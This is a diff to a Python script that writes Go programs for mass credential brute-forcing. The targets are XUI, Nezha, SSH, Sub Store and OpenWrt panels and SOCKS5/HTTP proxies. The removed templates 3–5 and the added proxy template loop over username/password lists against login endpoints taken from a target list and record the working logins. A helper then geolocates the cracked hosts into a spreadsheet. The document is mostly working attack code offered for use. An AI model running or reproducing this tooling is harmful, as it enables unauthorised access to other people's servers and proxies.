@@ -20,7 +20,7 @@ try:
 except ImportError:
     pass
 
-# =========================== xui.go模板1内容 (修正未使用的导入) ===========================
+# =========================== xui.go模板1内容 (XUI面板) ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
 import (
@@ -165,29 +165,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
-
 func main() {
 	go func() {
 		http.ListenAndServe("localhost:6060", nil)
@@ -231,7 +208,6 @@ func main() {
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
-	// go updateProgress() // 注释掉此行
 
 	for _, line := range batch {
 		wg.Add(1)
@@ -243,7 +219,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板2内容 (修正未使用的导入) ===========================
+# =========================== xui.go模板2内容 (哪吒面板) ===========================
 XUI_GO_TEMPLATE_2 = '''package main
 
 import (
@@ -390,29 +366,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
-
 func main() {
 	go func() {
 		http.ListenAndServe("localhost:6060", nil)
@@ -456,7 +409,6 @@ func main() {
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
-	// go updateProgress()
 
 	for _, line := range batch {
 		wg.Add(1)
@@ -468,667 +420,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板3内容 (修正未使用的导入) ===========================
-XUI_GO_TEMPLATE_3 = '''package main
-
-import (
-	"bufio"
-	"context"
-	"encoding/json"
-	"fmt"
-	"io"
-	"net/http"
-	_ "net/http/pprof"
-	"net/url"
-	"os"
-	"os/signal"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var totalTasks int64
-var startTime time.Time
-var shutdownRequest = make(chan struct{})
-
-var bufferPool = sync.Pool{
-	New: func() interface{} {
-		b := make([]byte, 4*1024)
-		return &b
-	},
-}
-
-var httpClient = &http.Client{
-	Transport: &http.Transport{
-		MaxIdleConnsPerHost: 100,
-	},
-	Timeout: 10 * time.Second,
-}
-
-func readLines(path string) ([]string, error) {
-	file, err := os.Open(path)
-	if err != nil {
-		return nil, err
-	}
-	defer file.Close()
-
-	var lines []string
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-        if line != "" {
-		    lines = append(lines, line)
-        }
-	}
-	return lines, scanner.Err()
-}
-
-func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	data := map[string]string{
-		"username": username,
-		"pass": password,
-	}
-	jsonPayload, _ := json.Marshal(data)
-	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
-	if err != nil {
-		return nil, err
-	}
-	req.Header.Add("Content-Type", "application/json;charset=UTF-8")
-	req.Header.Add("Accept", "application/json, text/plain, */*")
-	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0")
-	req = req.WithContext(ctx)
-	return httpClient.Do(req)
-}
-
-func writeResultToFile(file *os.File, text string) {
-	file.WriteString(text)
-}
-
-func processIP(line string, file *os.File, usernames []string, passwords []string) {
-	defer func() {
-		atomic.AddInt64(&completedCount, 1)
-		<-semaphore
-		wg.Done()
-	}()
-
-	select {
-	case <-shutdownRequest:
-		return
-	case semaphore <- struct{}{}:
-	}
-
-	var ipPort string
-	u, err := url.Parse(strings.TrimSpace(line))
-	if err == nil && u.Host != "" {
-		ipPort = u.Host
-	} else {
-		ipPort = strings.TrimSpace(line)
-	}
-
-	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 {
-		return
-	}
-	ip := parts[0]
-	port := parts[1]
-
-	for _, username := range usernames {
-		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			checkUrl := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
-			resp, err := postRequest(ctx, checkUrl, username, password)
-			cancel()
-			if err != nil {
-				continue
-			}
-			
-			if resp.StatusCode == http.StatusOK {
-				bufPtr := bufferPool.Get().(*[]byte)
-				body, _ := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
-
-				var responseData map[string]interface{}
-				if err := json.Unmarshal(body, &responseData); err == nil {
-					if data, ok := responseData["data"].(map[string]interface{}); ok {
-						if token, exists := data["accessToken"].(string); exists && token != "" {
-							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-							resp.Body.Close()
-							return
-						}
-					}
-				}
-			}
-			resp.Body.Close()
-		}
-	}
-}
-
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
-
-func main() {
-	go func() {
-		http.ListenAndServe("localhost:6060", nil)
-	}()
-
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
-		close(shutdownRequest)
-	}()
-
-	inputFile := "results.txt"
-	batch, err := readLines(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-
-	usernames := {user_list}
-	passwords := {pass_list}
-
-    if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。")
-        return
-    }
-
-	outputFile := "xui.txt"
-	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer file.Close()
-
-	totalTasks = int64(len(batch))
-    if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务。")
-        return
-    }
-    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
-	startTime = time.Now()
-	// go updateProgress()
-
-	for _, line := range batch {
-		wg.Add(1)
-		go processIP(line, file, usernames, passwords)
-	}
-
-	wg.Wait()
-	time.Sleep(1 * time.Second)
-	fmt.Println("\\n全部处理完成！")
-}
-'''
-# =========================== xui.go模板4内容 (修正未使用的导入) ===========================
-XUI_GO_TEMPLATE_4 = '''package main
-
-import (
-	"bufio"
-	"context"
-	"encoding/json"
-	"fmt"
-	"io"
-	"net/http"
-	_ "net/http/pprof"
-	"net/url"
-	"os"
-	"os/signal"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var totalTasks int64
-var startTime time.Time
-var shutdownRequest = make(chan struct{})
-
-var bufferPool = sync.Pool{
-	New: func() interface{} {
-		b := make([]byte, 4*1024)
-		return &b
-	},
-}
-
-var httpClient = &http.Client{
-	Transport: &http.Transport{
-		MaxIdleConnsPerHost: 100,
-	},
-	Timeout: 10 * time.Second,
-}
-
-func readLines(path string) ([]string, error) {
-	file, err := os.Open(path)
-	if err != nil {
-		return nil, err
-	}
-	defer file.Close()
-
-	var lines []string
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-        if line != "" {
-		    lines = append(lines, line)
-        }
-	}
-	return lines, scanner.Err()
-}
-
-func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	payload := map[string]string{
-		"username": username,
-		"password": password,
-	}
-	jsonPayload, _ := json.Marshal(payload)
-
-	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
-	if err != nil {
-		return nil, err
-	}
-
-	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
-	req.Header.Set("Accept", "application/json, text/plain, */*")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
-	req = req.WithContext(ctx)
-
-	return httpClient.Do(req)
-}
-
-func writeResultToFile(file *os.File, text string) {
-	file.WriteString(text)
-}
-
-func processIP(line string, file *os.File, usernames []string, passwords []string) {
-	defer func() {
-		atomic.AddInt64(&completedCount, 1)
-		<-semaphore
-		wg.Done()
-	}()
-
-	select {
-	case <-shutdownRequest:
-		return
-	case semaphore <- struct{}{}:
-	}
-
-	var ipPort string
-	u, err := url.Parse(strings.TrimSpace(line))
-	if err == nil && u.Host != "" {
-		ipPort = u.Host
-	} else {
-		ipPort = strings.TrimSpace(line)
-	}
-
-	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 {
-		return
-	}
-	ip := parts[0]
-	port := parts[1]
-	checkUrl := fmt.Sprintf("http://%s:%s/login", ip, port)
-
-	for _, username := range usernames {
-		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			resp, err := postRequest(ctx, checkUrl, username, password)
-			cancel()
-
-			if err != nil {
-				continue
-			}
-			
-			if resp.StatusCode == 200 {
-				bufPtr := bufferPool.Get().(*[]byte)
-				body, _ := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
-
-				var responseData map[string]interface{}
-				if err := json.Unmarshal(body, &responseData); err == nil {
-					if success, ok := responseData["success"].(bool); ok && success {
-						if data, ok := responseData["data"].(map[string]interface{}); ok {
-							if token, exists := data["token"]; exists && token != "" {
-								writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-								resp.Body.Close()
-								return
-							}
-						}
-					}
-				}
-			}
-			resp.Body.Close()
-		}
-	}
-}
-
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
-
-func main() {
-	go func() {
-		http.ListenAndServe("localhost:6060", nil)
-	}()
-
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
-		close(shutdownRequest)
-	}()
-
-	inputFile := "results.txt"
-	batch, err := readLines(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-
-	usernames := {user_list}
-	passwords := {pass_list}
-
-    if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。")
-        return
-    }
-
-	outputFile := "xui.txt"
-	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer file.Close()
-
-	totalTasks = int64(len(batch))
-    if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务。")
-        return
-    }
-    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
-	startTime = time.Now()
-	// go updateProgress()
-
-	for _, line := range batch {
-		wg.Add(1)
-		go processIP(line, file, usernames, passwords)
-	}
-
-	wg.Wait()
-	time.Sleep(1 * time.Second)
-	fmt.Println("\\n全部处理完成！")
-}
-'''
-# =========================== xui.go模板5内容 (修正未使用的导入) ===========================
-XUI_GO_TEMPLATE_5 = '''package main
-
-import (
-	"bufio"
-	"context"
-	"encoding/json"
-	"fmt"
-	"io"
-	"net/http"
-	_ "net/http/pprof"
-	"net/url"
-	"os"
-	"os/signal"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var totalTasks int64
-var startTime time.Time
-var shutdownRequest = make(chan struct{})
-
-var bufferPool = sync.Pool{
-	New: func() interface{} {
-		b := make([]byte, 4*1024)
-		return &b
-	},
-}
-
-var httpClient = &http.Client{
-	Transport: &http.Transport{
-		MaxIdleConnsPerHost: 100,
-	},
-	Timeout: 10 * time.Second,
-}
-
-func readLines(path string) ([]string, error) {
-	file, err := os.Open(path)
-	if err != nil {
-		return nil, err
-	}
-	defer file.Close()
-
-	var lines []string
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-        if line != "" {
-		    lines = append(lines, line)
-        }
-	}
-	return lines, scanner.Err()
-}
-
-func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	form := fmt.Sprintf("user=%s&pass=%s", username, password)
-	body := strings.NewReader(form)
-
-	req, err := http.NewRequest("POST", url, body)
-	if err != nil {
-		return nil, err
-	}
-
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
-	req.Header.Set("Accept", "application/json, text/plain, */*")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
-	req.Header.Set("X-Requested-With", "XMLHttpRequest")
-	req = req.WithContext(ctx)
-
-	return httpClient.Do(req)
-}
-
-func writeResultToFile(file *os.File, text string) {
-	file.WriteString(text)
-}
-
-func processIP(line string, file *os.File, usernames []string, passwords []string) {
-	defer func() {
-		atomic.AddInt64(&completedCount, 1)
-		<-semaphore
-		wg.Done()
-	}()
-
-	select {
-	case <-shutdownRequest:
-		return
-	case semaphore <- struct{}{}:
-	}
-
-	var ipPort string
-	u, err := url.Parse(strings.TrimSpace(line))
-	if err == nil && u.Host != "" {
-		ipPort = u.Host
-	} else {
-		ipPort = strings.TrimSpace(line)
-	}
-
-	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 {
-		return
-	}
-	ip := parts[0]
-	port := parts[1]
-	checkUrl := fmt.Sprintf("http://%s:%s/app/api/login", ip, port)
-
-	for _, username := range usernames {
-		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			resp, err := postRequest(ctx, checkUrl, username, password)
-			cancel()
-
-			if err != nil {
-				continue
-			}
-
-			if resp.StatusCode == 200 {
-				bufPtr := bufferPool.Get().(*[]byte)
-				body, _ := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
-
-				var responseData map[string]interface{}
-				if err := json.Unmarshal(body, &responseData); err == nil {
-					if success, ok := responseData["success"].(bool); ok && success {
-						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-						resp.Body.Close()
-						return
-					}
-				}
-			}
-			resp.Body.Close()
-		}
-	}
-}
-
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
-
-func main() {
-	go func() {
-		http.ListenAndServe("localhost:6060", nil)
-	}()
-
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
-		close(shutdownRequest)
-	}()
-
-	inputFile := "results.txt"
-	batch, err := readLines(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-
-	usernames := {user_list}
-	passwords := {pass_list}
-
-    if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。")
-        return
-    }
-
-	outputFile := "xui.txt"
-	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer file.Close()
-
-	totalTasks = int64(len(batch))
-    if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务。")
-        return
-    }
-    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
-	startTime = time.Now()
-	// go updateProgress()
-
-	for _, line := range batch {
-		wg.Add(1)
-		go processIP(line, file, usernames, passwords)
-	}
-
-	wg.Wait() 
-	time.Sleep(1 * time.Second)
-	fmt.Println("\\n全部处理完成！")
-}
-'''
-# =========================== xui.go模板6内容 (注释掉进度打印) ===========================
+# =========================== xui.go模板6内容 (SSH) ===========================
 XUI_GO_TEMPLATE_6 = '''package main
 
 import (
@@ -1287,29 +579,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 		}
 	}
 }
-
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
 
 var retryFlag = false
 
@@ -1498,8 +767,6 @@ RETRY:
 	startTime = time.Now()
 	completedCount = 0
 	
-	// go updateProgress()
-
 	outputFile := "xui.txt"
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -1524,7 +791,7 @@ RETRY:
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板7内容 (注释掉进度打印) ===========================
+# =========================== xui.go模板7内容 (Sub Store) ===========================
 XUI_GO_TEMPLATE_7 = '''package main
 
 import (
@@ -1670,29 +937,6 @@ func processIP(line string, file *os.File, paths []string, client *http.Client) 
 	}
 }
 
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
-
 func main() {
 	go func() {
 		http.ListenAndServe("localhost:6060", nil)
@@ -1736,7 +980,6 @@ func main() {
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
-	// go updateProgress()
 
 	client := &http.Client{
 		Transport: &http.Transport{
@@ -1755,7 +998,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板8内容 (注释掉进度打印) ===========================
+# =========================== xui.go模板8内容 (OpenWrt) ===========================
 XUI_GO_TEMPLATE_8 = '''package main
 
 import (
@@ -1908,29 +1151,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-/*
-func updateProgress() {
-	progressTicker := time.NewTicker(1 * time.Second)
-	defer progressTicker.Stop()
-
-	for {
-		select {
-		case <-progressTicker.C:
-			count := atomic.LoadInt64(&completedCount)
-			if totalTasks > 0 {
-				percent := float64(count) / float64(totalTasks) * 100
-				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			}
-			if count >= totalTasks {
-				return
-			}
-		case <-shutdownRequest:
-			return
-		}
-	}
-}
-*/
-
 func main() {
 	go func() {
 		http.ListenAndServe("localhost:6060", nil)
@@ -1974,7 +1194,6 @@ func main() {
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
-	// go updateProgress()
 
 	for _, line := range batch {
 		wg.Add(1)
@@ -1986,6 +1205,225 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
+# =========================== PROXY_GO_TEMPLATE (SOCKS5, HTTP, HTTPS代理) ===========================
+PROXY_GO_TEMPLATE = '''package main
+
+import (
+	"bufio"
+	"context"
+	"crypto/tls"
+	"fmt"
+	"io/ioutil"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"golang.org/x/net/proxy"
+)
+
+var (
+	wg           sync.WaitGroup
+	semaphore    = make(chan struct{}, {semaphore_size})
+	completedCount int64
+	totalTasks   int64
+	proxyType    = "{proxy_type}"
+	authMode     = {auth_mode}
+	testURL      = "http://myip.ipip.net"
+	realIP       = ""
+)
+
+func getPublicIP(targetURL string) (string, error) {
+	client := &http.Client{Timeout: 15 * time.Second}
+	req, err := http.NewRequest("GET", targetURL, nil)
+	if err != nil {
+		return "", err
+	}
+	req.Header.Set("User-Agent", "curl/7.79.1")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+	ipString := string(body)
+	if strings.Contains(ipString, "当前 IP：") {
+		parts := strings.Split(ipString, "：")
+		if len(parts) > 1 {
+			ipParts := strings.Split(parts[1], " ")
+			return ipParts[0], nil
+		}
+	}
+	return strings.TrimSpace(ipString), nil
+}
+
+func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) (bool, error) {
+	transport := &http.Transport{
+		MaxIdleConnsPerHost: 10,
+	}
+
+	if proxyType == "http" || proxyType == "https" {
+		var proxyURLString string
+		if auth != nil && auth.User != "" {
+			proxyURLString = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
+		} else {
+			proxyURLString = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
+		}
+		proxyURL, err := url.Parse(proxyURLString)
+		if err != nil {
+			return false, err
+		}
+		transport.Proxy = http.ProxyURL(proxyURL)
+		if proxyType == "https" {
+			transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+		}
+	} else { // socks5
+		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
+			Timeout:   timeout,
+			KeepAlive: 30 * time.Second,
+		})
+		if err != nil {
+			return false, err
+		}
+		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+			return dialer.Dial(network, addr)
+		}
+	}
+
+	httpClient := &http.Client{
+		Transport: transport,
+		Timeout:   timeout,
+	}
+
+	req, err := http.NewRequest("GET", testURL, nil)
+	if err != nil {
+		return false, err
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
+
+	resp, err := httpClient.Do(req)
+	if err != nil {
+		return false, err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false, fmt.Errorf("无法读取响应")
+	}
+	proxyIP := string(body)
+	if strings.Contains(proxyIP, "当前 IP：") {
+		parts := strings.Split(proxyIP, "：")
+		if len(parts) > 1 {
+			ipParts := strings.Split(parts[1], " ")
+			proxyIP = ipParts[0]
+		}
+	}
+	proxyIP = strings.TrimSpace(proxyIP)
+
+	if realIP == "UNKNOWN" || proxyIP == "" {
+		return false, fmt.Errorf("无法获取IP验证")
+	}
+	if proxyIP == realIP {
+		return false, fmt.Errorf("透明代理")
+	}
+	return true, nil
+}
+
+func writeResult(file *os.File, result string) {
+	file.WriteString(result + "\\n")
+}
+
+func testProxy(proxyAddr string, outputFile *os.File) {
+	defer func() {
+		atomic.AddInt64(&completedCount, 1)
+		<-semaphore
+		wg.Done()
+	}()
+	semaphore <- struct{}{}
+
+	timeout := {timeout} * time.Second
+
+	checkAndFormat := func(auth *proxy.Auth) {
+		success, _ := checkConnection(proxyAddr, auth, timeout)
+		if success {
+			var result string
+			if auth != nil && auth.User != "" {
+				result = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
+			} else {
+				result = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
+			}
+			writeResult(outputFile, result)
+		}
+	}
+
+	switch authMode {
+	case 1: // No auth
+		checkAndFormat(nil)
+	case 2: // User/Pass files
+		usernames := {user_list}
+		passwords := {pass_list}
+		for _, user := range usernames {
+			for _, pass := range passwords {
+				auth := &proxy.Auth{User: user, Password: pass}
+				checkAndFormat(auth)
+			}
+		}
+	case 3: // Credentials file
+		credentials := {creds_list}
+		for _, cred := range credentials {
+			parts := strings.SplitN(cred, ":", 2)
+			if len(parts) == 2 {
+				auth := &proxy.Auth{User: parts[0], Password: parts[1]}
+				checkAndFormat(auth)
+			}
+		}
+	}
+}
+
+func main() {
+	var err error
+	realIP, err = getPublicIP(testURL)
+	if err != nil {
+		realIP = "UNKNOWN"
+	}
+
+	proxies, err := os.Open("results.txt")
+	if err != nil {
+		fmt.Printf("无法打开代理文件: %v\\n", err)
+		return
+	}
+	defer proxies.Close()
+
+	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Printf("无法创建输出文件: %v\\n", err)
+		return
+	}
+	defer outputFile.Close()
+
+	scanner := bufio.NewScanner(proxies)
+	for scanner.Scan() {
+		proxyAddr := strings.TrimSpace(scanner.Text())
+		if proxyAddr != "" {
+			wg.Add(1)
+			go testProxy(proxyAddr, outputFile)
+		}
+	}
+
+	wg.Wait()
+}
+'''
+
 # =========================== ipcx.py 内容 (增加tqdm风格进度条) ===========================
 IPCX_PY_CONTENT = r"""import requests
 import time
@@ -2043,14 +1481,17 @@ def adjust_column_width(ws):
         ws.column_dimensions[column_letter].width = adjusted_width
 
 def extract_ip_port(url):
-    match = re.search(r'https?://([^/\s]+)', url)
+    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
+    if match:
+        return match.group(3)
+    
+    # Fallback for simple ip:port
+    match = re.search(r'([^:/]+:\d+)', url)
     if match:
         return match.group(1)
-    
-    if ':' in url:
-        return url.split()[0]
-   
+
     return url.split()[0]
+
 
 def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
     elapsed_time = time.time() - start_time
@@ -2095,16 +1536,30 @@ def process_ip_port_file(input_file, output_excel):
     print_progress_bar(0, total_tasks, start_time, prefix='IP信息查询', suffix='开始...')
     for i, line in enumerate(lines):
         completed_tasks = i + 1
-        parts = line.split()
-        if len(parts) >= 3:
-            addr, user, passwd = parts[:3]
-        else:
-            addr = parts[0]
-            user = passwd = ''
-
+        
+        addr = line
+        user, passwd = '', ''
+        
+        # More robust parsing for proxy URLs
+        try:
+            parsed_url = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?(.+)', line)
+            if parsed_url:
+                user = parsed_url.group(2) or ''
+                passwd = parsed_url.group(3) or ''
+                addr = f"{parsed_url.group(1)}://{parsed_url.group(4)}"
+        except (TypeError, AttributeError):
+             # Fallback for simple ip:port user pass format
+            parts = line.split()
+            if len(parts) >= 3:
+                addr, user, passwd = parts[0], parts[1], parts[2]
+            else:
+                addr = parts[0]
+        
         ip_port = extract_ip_port(addr)
         ip_info = get_ip_info(ip_port)
-        row = [addr, ip_port, user, passwd] + ip_info[1:]
+        
+        # If user/passwd were parsed from URL, use them
+        row = [line, ip_port, user, passwd] + ip_info[1:]
 
         wb = load_workbook(output_excel)
         ws = wb.active
@@ -2119,7 +1574,6 @@ def process_ip_port_file(input_file, output_excel):
 
 if __name__ == "__main__":
     process_ip_port_file('xui.txt', 'xui.xlsx')
-
 """
 # =========================== 主脚本优化部分 ===========================
 # 定义Go可执行文件的绝对路径
@@ -2136,7 +1590,7 @@ def input_filename_with_default(prompt, default):
 def escape_go_string(s: str) -> str:
     return s.replace("\\", "\\\\").replace('"', '\\"')
 
-def generate_xui_go(semaphore_size, usernames, passwords):
+def generate_xui_go(semaphore_size, usernames, passwords, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
